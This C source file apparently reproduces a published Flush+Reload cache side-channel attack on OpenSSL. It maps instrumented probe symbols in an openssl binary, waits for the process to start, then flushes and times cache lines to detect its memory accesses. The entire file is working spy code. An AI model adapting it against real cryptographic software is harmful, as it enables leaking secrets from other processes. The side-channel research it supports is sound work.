#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <symbol.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/types.h>
#include <util.h>
#include "../src/low.h" // for memaccesstime/clflush

/* To make code more readable */
#define true 1
#define false 0

/* Exit codes */
// #define EXIT_SUCCESS				0
// #define EXIT_FAILURE				1
#define EXIT_SYMBOL_NOT_FOUND	2
#define EXIT_MMAP_FAIL				3
#define EXIT_HIT							4
#define EXIT_MISS							5

/* Parameters */
#define DELAY			1000	// Default: 1000				// How many clock cycles to wait between memory access
#define THRESHOLD	140		// Default: 100/120/140	// How much time between memory access to count as hit
#define PATH_TO_OPENSSL "/usr/local/ssl/bin/openssl"
#define BINARY_OPENSSL "openssl"

#define DEBUG false			// Print extra info

/* List of symbols to monitor in the attacked ELF */
char *monitor[] = {
	"probe1",
	"probe2"
};

/* Number of monitors */
int nmonitor = sizeof(monitor)/sizeof(monitor[0]);

/*
 * Given the process file name (like "openssl", not the full path to it!)
 * will return the PID of the process if its running, otherwise will return -1.
 */
pid_t proc_find(const char* name) {
	// Credit: https://stackoverflow.com/questions/6898337/determine-programmatically-if-a-program-is-running
	DIR* dir;
	struct dirent* ent;
	char buf[512];

	long  pid;
	char pname[100] = {0,};
	char state;
	FILE *fp=NULL; 

	if (!(dir = opendir("/proc"))) {
		perror("can't open /proc");
		return -1;
	}

	while((ent = readdir(dir)) != NULL) {
		long lpid = atol(ent->d_name);
		if(lpid < 0)
			continue;
		snprintf(buf, sizeof(buf), "/proc/%ld/stat", lpid);
		fp = fopen(buf, "r");

		if (fp) {
			if ( (fscanf(fp, "%ld (%[^)]) %c", &pid, pname, &state)) != 3 ) {
				printf("fscanf failed \n");
				fclose(fp);
				closedir(dir);
				return -1; 
			}
			if (!strcmp(pname, name)) {
				fclose(fp);
				closedir(dir);
				return (pid_t)lpid;
			}
			fclose(fp);
		}
	}

	closedir(dir);
	return -1;
}

/*
 * Assuming the attacked program is already running.
 * 
 * Notes:
 * In the article, page 8, top left: "We use the Flush+Reload attack [69], as implemented in the Mastik toolkit [68]."
 * Thus, we used the exact same function as mastik provied.
 * To find the memory location: sym_getsymboloffset()
 * To share the memory location: map_offset()
 * To flush: clflush()
 * To wait between flush and memory access: delayloop()
 * To access the memory and check time of access: memaccesstime()
 * 
 * Also, from the same place in the article: "if both locations are accessed within a short interval, we reduce the likelihood of false positives"
 * Therefore, we return "HIT" only if all of the monitors return "HIT".
 */
int main(int ac, char **av) {
	/* Path to attacked ELF */
	static char *binary = PATH_TO_OPENSSL;

	/* Creating addresses array to be probe */
	void** addrs = malloc(nmonitor * sizeof(void*));

	/* Finding and sharing the attacked virtual addresses */
	for(int i = 0; i < nmonitor; ++i) {
		uint64_t offset = sym_getsymboloffset(binary, monitor[i]);
		#if DEBUG
			printf("Debug :: Monitor[%d] : offset=%lu\n", i, offset);
		#endif
		if(offset == ~0ULL) {
			#if DEBUG
				fprintf(stderr, "Debug :: Monitor[%d] : Cannot find %s in %s\n", i, monitor[i], binary);
			#endif
			free(addrs);
			exit(EXIT_SYMBOL_NOT_FOUND);
		}
		addrs[i] = map_offset(binary, offset);
		if(addrs[i] == NULL) {
			#if DEBUG
				fprintf(stderr, "Debug :: Monitor[%d] : Couldn't share the address with the spy program\n", i);
			#endif
			free(addrs);
			exit(EXIT_MMAP_FAIL);
		}
	}

	/* Creating result array (the access time length) */
	int* res = malloc(nmonitor * sizeof(int));

	/* Waiting until the attacked program starts running */
	while(proc_find(BINARY_OPENSSL) < 0) {
		// Busy-wait
		#if DEBUG
			fprintf(stderr, "Debug :: Attacked program hasn't start yet\n");
		#endif
	}
	#if DEBUG
		fprintf(stderr, "Debug :: Attacked program has started\n");
	#endif

	/* Flushing the memory */
	for(int i = 0; i < nmonitor; ++i)
		clflush(addrs[i]);

	/* Waiting so the attacked will try to access the memory */
	delayloop(DELAY);

	/* Checking access time */
	for(int i = 0; i < nmonitor; ++i) {
		res[i] = memaccesstime(addrs[i]);
		#if DEBUG
			printf("Debug :: Monitor[%d] : res=%d\n", i, res[i]);
		if(res[i] < THRESHOLD)
			printf("Debug :: Monitor[%d] : Hit\n", i);
		else
			printf("Debug :: Monitor[%d] : Miss\n", i);
		#endif
	}

	/* Deciding if HIT or MISS */
	for(int i = 0; i < nmonitor; ++i) {
		if(res[i] >= THRESHOLD) {
			free(res);
			free(addrs);
			exit(EXIT_MISS);
		}
	}

	free(res);
	free(addrs);
	exit(EXIT_HIT);
}
